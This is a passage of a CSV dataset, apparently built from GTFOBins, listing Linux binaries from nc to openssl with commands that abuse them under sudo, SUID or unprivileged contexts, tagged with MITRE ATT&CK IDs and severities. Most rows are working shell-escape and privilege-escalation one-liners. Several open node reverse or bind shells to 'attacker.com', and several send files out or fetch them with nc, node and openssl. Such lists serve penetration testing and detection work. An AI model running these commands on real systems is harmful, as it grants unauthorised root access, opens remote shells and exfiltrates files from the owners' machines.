1107,Linux,nc -l -p 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1108,Linux,nc -l -p 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/nc/
1109,Linux,nc attacker.com 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nc/
1110,Linux,nc attacker.com 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/nc/
1111,Linux,nc attacker.com 12345 </path/to/input-file,Abuse the 'nc' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually read by the invoking shell.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/nc/
1112,Linux,ncdu b,Abuse the 'ncdu' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ncdu/
1113,Linux,ncdu b,Abuse the 'ncdu' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ncdu/
1114,Linux,ncdu b,Abuse the 'ncdu' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ncdu/
1115,Linux,ncftp !/bin/sh,Abuse the 'ncftp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ncftp/
1116,Linux,ncftp !/bin/sh -p,Abuse the 'ncftp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ncftp/
1117,Linux,ncftp !/bin/sh,Abuse the 'ncftp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ncftp/
1118,Linux,echo '...' >/path/to/temp-file needrestart -c /path/to/temp-file,Abuse the 'needrestart' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/needrestart/
1119,Linux,echo '...' >/path/to/temp-file needrestart -c /path/to/temp-file,Abuse the 'needrestart' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Perl code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/needrestart/
1120,Linux,neofetch --ascii /path/to/input-file,Abuse the 'neofetch' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is used as the logo while some other information is displayed on its right.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/neofetch/
1121,Linux,neofetch --ascii /path/to/input-file,Abuse the 'neofetch' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is used as the logo while some other information is displayed on its right.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/neofetch/
1122,Linux,echo 'exec /bin/sh' >/path/to/temp-file neofetch --config /path/to/temp-file,Abuse the 'neofetch' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/neofetch/
1123,Linux,echo 'exec /bin/sh' >/path/to/temp-file neofetch --config /path/to/temp-file,Abuse the 'neofetch' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/neofetch/
1124,Linux,nft -f /path/to/input-file,Abuse the 'nft' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nft/
1125,Linux,nft -f /path/to/input-file,Abuse the 'nft' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nft/
1126,Linux,cat >/path/to/temp-file <<EOF user root; http { server { listen 80; root /; autoindex on; dav_methods PUT; } } events {} EOF nginx -c /path/to/temp-file,Abuse the 'nginx' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nginx/
1127,Linux,cat >/path/to/temp-file <<EOF load_module /path/to/lib.so; EOF nginx -t -c /path/to/temp-file,"Abuse the 'nginx' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions. Alternatively, the `ssl_engine` directive can be used.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nginx/
1128,Linux,cat >/path/to/temp-file <<EOF load_module /path/to/lib.so; EOF nginx -t -c /path/to/temp-file,"Abuse the 'nginx' binary (library load) in a suid context to escalate privileges or execute arbitrary actions. Alternatively, the `ssl_engine` directive can be used.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/nginx/
1129,Linux,cat >/path/to/temp-file <<EOF load_module /path/to/lib.so; EOF nginx -t -c /path/to/temp-file,"Abuse the 'nginx' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions. Alternatively, the `ssl_engine` directive can be used.",Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/nginx/
1130,Linux,cat >/path/to/temp-file <<EOF user root; http { server { listen 80; root /; autoindex on; dav_methods PUT; } } events {} EOF nginx -c /path/to/temp-file,Abuse the 'nginx' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nginx/
1131,Linux,nice /bin/sh,Abuse the 'nice' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nice/
1132,Linux,nice /bin/sh -p,Abuse the 'nice' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nice/
1133,Linux,nice /bin/sh,Abuse the 'nice' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nice/
1134,Linux,nl -bn -w1 -s '' /path/to/input-file,Abuse the 'nl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by a leading space added to each line.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nl/
1135,Linux,nl -bn -w1 -s '' /path/to/input-file,Abuse the 'nl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by a leading space added to each line.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nl/
1136,Linux,nl -bn -w1 -s '' /path/to/input-file,Abuse the 'nl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by a leading space added to each line.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nl/
1137,Linux,nm /path/to/input-file,Abuse the 'nm' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed through error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nm/
1138,Linux,nm /path/to/input-file,Abuse the 'nm' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed through error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nm/
1139,Linux,nm /path/to/input-file,Abuse the 'nm' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is treated as command line options and disclosed through error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nm/
1140,Linux,nmap -iL /path/to/input-file,"Abuse the 'nmap' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nmap/
1141,Linux,nmap -iL /path/to/input-file,"Abuse the 'nmap' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nmap/
1142,Linux,nmap -iL /path/to/input-file,"Abuse the 'nmap' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nmap/
1143,Linux,nmap -oG=/path/to/output-file DATA,Abuse the 'nmap' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The payload appears inside the regular nmap output.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/nmap/
1144,Linux,nmap -oG=/path/to/output-file DATA,Abuse the 'nmap' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The payload appears inside the regular nmap output.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/nmap/
1145,Linux,nmap -oG=/path/to/output-file DATA,Abuse the 'nmap' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The payload appears inside the regular nmap output.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/nmap/
1146,Linux,echo '...' >/path/to/temp-file nmap --script=/path/to/temp-file,Abuse the 'nmap' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nmap/
1147,Linux,echo '...' >/path/to/temp-file nmap --script=/path/to/temp-file,Abuse the 'nmap' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/nmap/
1148,Linux,echo '...' >/path/to/temp-file nmap --script=/path/to/temp-file,Abuse the 'nmap' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/nmap/
1149,Linux,nmap --interactive !/bin/sh,Abuse the 'nmap' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nmap/
1150,Linux,nmap --interactive !/bin/sh,Abuse the 'nmap' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nmap/
1151,Linux,nmap --interactive !/bin/sh,Abuse the 'nmap' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nmap/
1152,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").createServer(function (client) { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }).listen(12345)'",Abuse the 'node' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/node/
1153,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh"", [""-p""]); require(""net"").createServer(function (client) { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }).listen(12345)'",Abuse the 'node' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/node/
1154,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").createServer(function (client) { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }).listen(12345)'",Abuse the 'node' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/node/
1155,Linux,"node -e 'require(""http"").get(""http://attacker.com/path/to/input-file"", res => res.pipe(require(""fs"").createWriteStream(""/path/to/output-file"")))'",Abuse the 'node' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/node/
1156,Linux,"node -e 'require(""http"").get(""http://attacker.com/path/to/input-file"", res => res.pipe(require(""fs"").createWriteStream(""/path/to/output-file"")))'",Abuse the 'node' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/node/
1157,Linux,"node -e 'require(""http"").get(""http://attacker.com/path/to/input-file"", res => res.pipe(require(""fs"").createWriteStream(""/path/to/output-file"")))'",Abuse the 'node' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/node/
1158,Linux,"node -e 'process.stdout.write(require(""fs"").readFileSync(""/path/to/input-file""))'",Abuse the 'node' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/node/
1159,Linux,"node -e 'process.stdout.write(require(""fs"").readFileSync(""/path/to/input-file""))'",Abuse the 'node' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/node/
1160,Linux,"node -e 'process.stdout.write(require(""fs"").readFileSync(""/path/to/input-file""))'",Abuse the 'node' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/node/
1161,Linux,"node -e 'require(""fs"").writeFileSync(""/path/to/output-file"", ""DATA"")'",Abuse the 'node' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/node/
1162,Linux,"node -e 'require(""fs"").writeFileSync(""/path/to/output-file"", ""DATA"")'",Abuse the 'node' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/node/
1163,Linux,"node -e 'require(""fs"").writeFileSync(""/path/to/output-file"", ""DATA"")'",Abuse the 'node' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/node/
1164,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").connect(12345, ""attacker.com"", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'",Abuse the 'node' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/node/
1165,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh"", [""-p""]); require(""net"").connect(12345, ""attacker.com"", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'",Abuse the 'node' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/node/
1166,Linux,"node -e 'sh = require(""child_process"").spawn(""/bin/sh""); require(""net"").connect(12345, ""attacker.com"", function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'",Abuse the 'node' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/node/
1167,Linux,"node -e 'process.setuid(0); require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'",Abuse the 'node' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/node/
1168,Linux,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'",Abuse the 'node' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/node/
1169,Linux,"node -e 'require(""child_process"").spawn(""/bin/sh"", [""-p""], {stdio: [0, 1, 2]})'",Abuse the 'node' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/node/
1170,Linux,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'",Abuse the 'node' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/node/
1171,Linux,"node -e 'require(""fs"").createReadStream(""/path/to/input-file"").pipe(require(""http"").request(""http://attacker.com/path/to/output-file""))'",Abuse the 'node' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/node/
1172,Linux,"node -e 'require(""fs"").createReadStream(""/path/to/input-file"").pipe(require(""http"").request(""http://attacker.com/path/to/output-file""))'",Abuse the 'node' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/node/
1173,Linux,"node -e 'require(""fs"").createReadStream(""/path/to/input-file"").pipe(require(""http"").request(""http://attacker.com/path/to/output-file""))'",Abuse the 'node' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/node/
1174,Linux,nohup /path/to/command cat nohup.out,Abuse the 'nohup' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The `nohup.out` file contains the standard output and error of the command.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nohup/
1175,Linux,nohup /path/to/command cat nohup.out,Abuse the 'nohup' binary (command) in a suid context to escalate privileges or execute arbitrary actions. The `nohup.out` file contains the standard output and error of the command.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nohup/
1176,Linux,nohup /path/to/command cat nohup.out,Abuse the 'nohup' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. The `nohup.out` file contains the standard output and error of the command.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/nohup/
1177,Linux,nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty',Abuse the 'nohup' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This creates a `nohup.out` file in the current working directory.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nohup/
1178,Linux,nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty',Abuse the 'nohup' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This creates a `nohup.out` file in the current working directory.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nohup/
1179,Linux,nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty',Abuse the 'nohup' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This creates a `nohup.out` file in the current working directory.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nohup/
1180,Linux,npm exec /bin/sh,Abuse the 'npm' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/npm/
1181,Linux,npm exec /bin/sh,Abuse the 'npm' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/npm/
1182,Linux,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json npm -C . i",Abuse the 'npm' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/npm/
1183,Linux,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json npm -C . i",Abuse the 'npm' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/npm/
1184,Linux,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json npm -C . run xxx",Abuse the 'npm' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/npm/
1185,Linux,"echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json npm -C . run xxx",Abuse the 'npm' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/npm/
1186,Linux,nroff /path/to/input-file,Abuse the 'nroff' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is typeset and some warning messages may appear.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/nroff/
1187,Linux,nroff /path/to/input-file,Abuse the 'nroff' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is typeset and some warning messages may appear.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/nroff/
1188,Linux,echo /bin/sh >groff chmod +x groff GROFF_BIN_PATH=. nroff,Abuse the 'nroff' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nroff/
1189,Linux,echo /bin/sh >groff chmod +x groff GROFF_BIN_PATH=. nroff,Abuse the 'nroff' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nroff/
1190,Linux,nsenter /bin/sh,Abuse the 'nsenter' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The shell command can be omitted.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/nsenter/
1191,Linux,nsenter /bin/sh -p,Abuse the 'nsenter' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The shell command can be omitted.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/nsenter/
1192,Linux,nsenter /bin/sh,Abuse the 'nsenter' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The shell command can be omitted.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/nsenter/
1193,Linux,ntpdate -a x -k /path/to/input-file -d localhost,Abuse the 'ntpdate' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and lines are leaked through error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ntpdate/
1194,Linux,ntpdate -a x -k /path/to/input-file -d localhost,Abuse the 'ntpdate' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and lines are leaked through error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ntpdate/
1195,Linux,ntpdate -a x -k /path/to/input-file -d localhost,Abuse the 'ntpdate' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and lines are leaked through error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ntpdate/
1196,Linux,"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",Abuse the 'octave' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/octave/
1197,Linux,"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",Abuse the 'octave' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/octave/
1198,Linux,"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",Abuse the 'octave' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/octave/
1199,Linux,"octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'",Abuse the 'octave' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/octave/
1200,Linux,"octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'",Abuse the 'octave' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/octave/
1201,Linux,"octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'",Abuse the 'octave' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/octave/
1202,Linux,"octave-cli --eval 'system(""/bin/sh"")'",Abuse the 'octave' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/octave/
1203,Linux,"octave-cli --eval 'system(""/bin/sh"")'",Abuse the 'octave' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/octave/
1204,Linux,"octave-cli --eval 'system(""/bin/sh"")'",Abuse the 'octave' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/octave/
1205,Linux,od -An -c -w999 /path/to/input-file,"Abuse the 'od' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/od/
1206,Linux,od -An -c -w999 /path/to/input-file,"Abuse the 'od' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/od/
1207,Linux,od -An -c -w999 /path/to/input-file,"Abuse the 'od' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/od/
1208,Linux,opencode ! /path/to/command,Abuse the 'opencode' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/opencode/
1209,Linux,opencode ! /path/to/command,Abuse the 'opencode' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/opencode/
1210,Linux,opencode ! /path/to/command,Abuse the 'opencode' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/opencode/
1211,Linux,opencode db '...',Abuse the 'opencode' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run SQLite queries (`...`) provided that `sqlite3` is installed.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/opencode/
1212,Linux,opencode db '...',Abuse the 'opencode' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run SQLite queries (`...`) provided that `sqlite3` is installed.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/opencode/
1213,Linux,openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file,Abuse the 'openssl' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1214,Linux,openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file,Abuse the 'openssl' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1215,Linux,openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file,Abuse the 'openssl' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/openssl/
1216,Linux,openssl enc -in /path/to/input-file,Abuse the 'openssl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1217,Linux,openssl enc -in /path/to/input-file,Abuse the 'openssl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
1218,Linux,openssl enc -in /path/to/input-file,Abuse the 'openssl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/openssl/
1219,Linux,echo DATA | openssl enc -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/openssl/
1220,Linux,echo DATA | openssl enc -out /path/to/output-file,Abuse the 'openssl' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/openssl/
